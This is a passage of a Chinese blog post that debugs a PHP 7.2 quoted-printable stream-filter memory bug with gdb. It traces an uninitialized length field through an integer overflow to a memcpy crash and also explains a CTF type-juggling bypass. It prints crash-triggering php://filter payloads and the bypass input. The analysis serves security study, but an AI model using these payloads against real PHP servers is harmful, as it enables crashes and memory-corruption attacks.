+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ gdb -q php7</span><br><span class="line">pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line"></span><br><span class="line">Reading symbols from php7...done.</span><br><span class="line">pwndbg&gt; b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 433</span><br><span class="line">Breakpoint 1 at 0x8d98f4: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 433.</span><br><span class="line">pwndbg&gt; b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 476</span><br><span class="line">Breakpoint 2 at 0x8d9a2b: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 476.</span><br><span class="line">pwndbg&gt; r test.php</span><br><span class="line">Starting program: /usr/bin/php7 test.php</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:244</span><br><span class="line">244	../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────[ REGISTERS ]───────────────────────────────────</span><br><span class="line"> RAX  0x7ffff44629c1 ◂— 0x7ffff4462a</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0xffffffffffffffff</span><br><span class="line"> RDX  0xffffffffffffffff</span><br><span class="line"> RDI  0x7ffff44629c1 ◂— 0x7ffff4462a</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7fffffffa060 ◂— 0x38 /* &apos;8&apos; */</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x9</span><br><span class="line"> R11  0x7ffff70bef90 ◂— lahf   </span><br><span class="line"> R12  0x4234e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde70 ◂— 0x2</span><br><span class="line"> R14  0x7ffff441e030 —▸ 0x7ffff4468820 —▸ 0xa04677 (execute_ex+169) ◂— call   0x97d65c</span><br><span class="line"> R15  0x7ffff4468820 —▸ 0xa04677 (execute_ex+169) ◂— call   0x97d65c</span><br><span class="line"> RBP  0x7fffffff9ff0 —▸ 0x7fffffffa0c0 —▸ 0x7fffffffa130 —▸ 0x7fffffffa1d0 —▸ 0x7fffffffa210 ◂— ...</span><br><span class="line"> RSP  0x7fffffff9f58 —▸ 0x850874 (php_conv_qprint_encode_convert+1301) ◂— mov    rax, qword ptr [rbp - 0x68]</span><br><span class="line"> RIP  0x7ffff7078164 (__memcpy_avx_unaligned+708) ◂— vmovdqu ymm4, ymmword ptr [rsi]</span><br><span class="line">────────────────────────────────────[ DISASM ]─────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7078164 &lt;__memcpy_avx_unaligned+708&gt;    vmovdqu ymm4, ymmword ptr [rsi]</span><br><span class="line">   0x7ffff7078168 &lt;__memcpy_avx_unaligned+712&gt;    vmovdqu xmm5, xmmword ptr [rsi +</span><br></pre></td></tr></table></figure>
+<p>直接Segmentation fault。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。草泥马哦</p>
+<p>过了一会再次调试，文章中调试肯定不是php7.2，好了。真特么玄学。</p>
+<p>原原本本在走一遍。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA&apos;));</span><br></pre></td></tr></table></figure>
+<p>第一步，执行<code>php_conv_convert</code>的时候，跳转到<code>php_conv_qprint_encode_convert</code></p>
+<p><img src="/assets/php_debug/TIM截图20181206205905.png" alt=""></p>
+<p>这是因为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php_conv_convert定义如下:</span><br><span class="line">#define php_conv_convert(a, b, c, d, e) ((php_conv *)(a))-&gt;convert_op((php_conv *)(a), (b), (c), (d), (e))</span><br><span class="line"></span><br><span class="line">调用如下:</span><br><span class="line">php_conv_convert(inst-&gt;cd, &amp;ps, &amp;icnt, &amp;pd, &amp;ocnt))</span><br><span class="line"></span><br><span class="line">(gdb) p *inst-&gt;cd</span><br><span class="line">$3 = &#123;convert_op = 0x85035f &lt;php_conv_qprint_encode_convert&gt;, dtor = 0x8502ce &lt;php_conv_qprint_encode_dtor&gt;&#125;</span><br></pre></td></tr></table></figure>
+<p>由于传入的参数中<code>ord(%bf)</code>大于126,所以进入如果所示分支:</p>
+<p><img src="/assets/php_debug/TIM截图20181206210427.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (line_ccnt &lt; 4) &#123;</span><br><span class="line">	if (ocnt &lt; inst-&gt;lbchars_len + 1) &#123;</span><br><span class="line">		err = PHP_CONV_ERR_TOO_BIG;       ## BUG的成因</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">    *(pd++) = &apos;=&apos;;</span><br><span class="line">    ocnt--;</span><br><span class="line">    line_ccnt--;</span><br><span class="line"></span><br><span class="line">    memcpy(pd, inst-&gt;lbchars, inst-&gt;lbchars_len);</span><br><span class="line">    pd += inst-&gt;lbchars_len;</span><br><span class="line">    ocnt -= inst-&gt;lbchars_len;</span><br><span class="line">    line_ccnt = inst-&gt;line_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时，<code>inst-&gt;lbchars_len =  3544952156018063160</code>，所以会返回<code>PHP_CONV_ERR_TOO_BIG</code>.</p>
+<p>该数值比较有意思：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ python</span><br><span class="line">Python 2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from libnum import *</span><br><span class="line">&gt;&gt;&gt; n2s(3544952156018063160)</span><br><span class="line">&apos;12345678&apos;</span><br></pre></td></tr></table></figure>
+<p>和我们payload中的<code>12345678</code>一致，是否意味着<code>inst-&gt;lbchars_len</code>可控？？？？</p>
+<p>同时，如果<code>ocnt &lt; inst-&gt;lbchars_len + 1</code>未能通过，那么程序将执行：</p>
+<p><code>memcpy(pd, inst-&gt;lbchars, inst-&gt;lbchars_len);</code>,</p>
+<p>如果<code>Inst-&gt;lbchars_len</code>可控，那么可以令<code>inst-&gt;lbchars_len = 0xffffffffffffffff</code>，那么就可以绕过<code>ocnt &lt; inst-&gt;lbchars_len + 1</code>,执行<code>memcpy(pd, inst-&gt;lbchars, inst-&gt;lbchars_len);</code>,由于<code>lbchars_len</code>过大，那么memcpy将会出错，导致core dump？？？？？？？？？？？？？？？？？？？？？</p>
+<p>返回<code>PHP_CONV_ERR_TOO_BIG</code>，程序来到下一步:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">case PHP_CONV_ERR_TOO_BIG: &#123;</span><br><span class="line">	char *new_out_buf;</span><br><span class="line">	size_t new_out_buf_size;</span><br><span class="line"></span><br><span class="line">	new_out_buf_size = out_buf_size &lt;&lt; 1;</span><br><span class="line">	/*</span><br><span class="line">         这里的new_out_buf_size为out_buf_size左移一位</span><br><span class="line">         也就是说如果out_buf_size为一个比较小的数字，下面的if恒不成立 </span><br><span class="line">        */</span><br><span class="line">	if (new_out_buf_size &lt; out_buf_size) &#123;</span><br><span class="line">        /* whoa! no bigger buckets are sold anywhere... */</span><br><span class="line">        if (NULL == (new_bucket = php_stream_bucket_new(stream, out_buf, (out_buf_size - ocnt), 1, persistent))) &#123;</span><br><span class="line">            goto out_failure;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        php_stream_bucket_append(buckets_out, new_bucket);</span><br><span class="line"></span><br><span class="line">        out_buf_size = ocnt = initial_out_buf_size;</span><br><span class="line">        out_buf = pemalloc(out_buf_size, persistent);</span><br><span class="line">        pd = out_buf;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">        new_out_buf = perealloc(out_buf, new_out_buf_size, persistent);</span><br><span class="line">        pd = new_out_buf + (pd - out_buf);</span><br><span class="line">        ocnt += (new_out_buf_size - out_buf_size);</span><br><span class="line">        out_buf = new_out_buf;</span><br><span class="line">        out_buf_size = new_out_buf_size;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; break;</span><br></pre></td></tr></table></figure>
+<p>由于返回<code>PHP_CONV_ERRTOO_BIG</code>，</p>
+<p>正常逻辑: 所以程序认为<code>out_buf_size</code>是一个很大的值，所以对<code>out_buf_size</code>进行左移一位的操作，这样的话，去掉高位，那么<code>new_out_buf_size &lt; out_buf_size</code>，然后, <code>goto out_failure</code>.</p>
+<p>事实上，<code>out_buf_size</code>是一个很小的值，那么<code>new_out_buf_size &lt; out_buf_size</code>将一直不成立。</p>
+<p>这样，程序将进入:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new_out_buf = perealloc(out_buf, new_out_buf_size, persistent);</span><br><span class="line">pd = new_out_buf + (pd - out_buf);</span><br><span class="line">ocnt += (new_out_buf_size - out_buf_size);</span><br><span class="line">out_buf = new_out_buf;</span><br><span class="line">out_buf_size = new_out_buf_size;</span><br></pre></td></tr></table></figure>
+<p><code>new_out_buf_size</code>不断翻倍，最终导致:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Allowed memory size of 134217728 bytes exhausted at /home/qianfa/Desktop/php_debug/php-7.2.12/ext/standard/filters.c:1601 (tried to allocate 117440512 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2</span><br></pre></td></tr></table></figure>
+<p>那么为什么，<code>inst-&gt;lbchars_len</code>会是<code>12345678</code>呢，查看inst初始化的过程。</p>
+<p><img src="/assets/php_debug/TIM截图20181206215110.png" alt=""></p>
+<p>由于我们使用<code>php://</code>没有对<code>convert.quoted-printable-encode</code>附加<code>options</code>, 所以这里的<code>options</code>就是<code>NULL</code>,一直到了<code>else</code>分支, 我们可以看到他传的参数为<code>(php_conv_qprint_encode *)retval, 0, NULL, 0, 0, opts, persistent)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (php_conv_qprint_encode_ctor((php_conv_qprint_encode *)retval, 0, NULL, 0, 0, opts, persistent)) &#123;</span><br><span class="line">	goto out_failure;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static php_conv_err_t php_conv_qprint_encode_ctor(php_conv_qprint_encode *inst, unsigned int line_len, const char *lbchars, size_t lbchars_len, int lbchars_dup, int opts, int persistent)&#123;。。。。。。&#125;</span><br></pre></td></tr></table></figure>
+<p>所以进入<code>php_conv_qprint_encode_ctor</code>,由于lbchars为NULL,所以<code>inst-&gt;lbchars_len</code>未被赋值。</p>
+<p><img src="/assets/php_debug/TIM截图20181206215505.png" alt=""></p>
+<p>从而导致，<code>inst-&gt;lbchars_len</code>未被初始化使用，为程序控制该值的值买下隐患。由于未被初始化，加上php中的内存操作相当多，所以，该内存存在被控制的风险。</p>
+<p>通过多次测试，可以发现，<code>inst-&gt;lbchars_len</code>的值由payload中的一部分填充。也就是上边所说的payload中的<code>12345678</code>。</p>
+<p>最终通过整数溢出，<code>0xffffffffffffffff + 1 = 0 &lt; ocnt</code>通过条件<code>ocnt &lt; inst-&gt;lbchars_len + 1</code>,导致<code>memcpy(pd, inst-&gt;lbchars, inst-&gt;lbchars_len);</code>,出错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+<p>总结，大佬们太强了，fuzz很重要。</p>
+<h2 id="php类型转换的问题"><a href="#php类型转换的问题" class="headerlink" title="php类型转换的问题"></a>php类型转换的问题</h2><p>案例: solveme.peng.kr winter sleep</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line">   if(isset($_GET[&apos;time&apos;]))&#123;</span><br><span class="line">       if(!is_numeric($_GET[&apos;time&apos;]))&#123;</span><br><span class="line">           echo &apos;The time must be number.&apos;;</span><br><span class="line">       &#125;else if($_GET[&apos;time&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">           echo &apos;This time is too short.&apos;;</span><br><span class="line">       &#125;else if($_GET[&apos;time&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">           echo &apos;This time is too long.&apos;;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           sleep((int)$_GET[&apos;time&apos;]);</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line">       echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>题目很简单，需要构造一个大于5184000,但是int之后很小的数字来绕过。<code>6e6</code>即可。</p>
+<h2 id="文件上传的问题"><a href="#文件上传的问题" class="headerlink" title="文件上传的问题"></a>文件上传的问题</h2><p>案例: 0CTF2018之ezDoor的全盘非预期解法</p>
+<ul>
+<li><p><a href="http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html" rel="external nofollow" target="_blank">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</a></p>
+</li>
+<li><p><a href="https://blog.zsxsoft.com/post/36" rel="external nofollow" target="_blank">https://blog.zsxsoft.com/post/36</a></p>
+</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://hackmd.io/s/rJlfZva0m#exp" rel="external nofollow" target="_blank">https://hackmd.io/s/rJlfZva0m#exp</a></li>
+<li><a href="https://paper.seebug.org/566/#solvemepengkr-winter-sleep" rel="external nofollow" target="_blank">https://paper.seebug.org/566/#solvemepengkr-winter-sleep</a></li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/31116/">https://www.tiandiwuji.top/posts/31116/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/31116/">December 5th 2018, 11:41:55 am</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/30918/" title="day-day-up">
+                    <div class="nextTitle">day-day-up</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/36891/" title="php7.2内核调试环境搭建">
+                    <div class="prevTitle">php7.2内核调试环境搭建</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#小菜，加油"><span class="toc-number">1.</span> <span class="toc-text">小菜，加油</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php流处理的bug"><span class="toc-number">2.</span> <span class="toc-text">php流处理的bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php类型转换的问题"><span class="toc-number">3.</span> <span class="toc-text">php类型转换的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传的问题"><span class="toc-number">4.</span> <span class="toc-text">文件上传的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 71
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
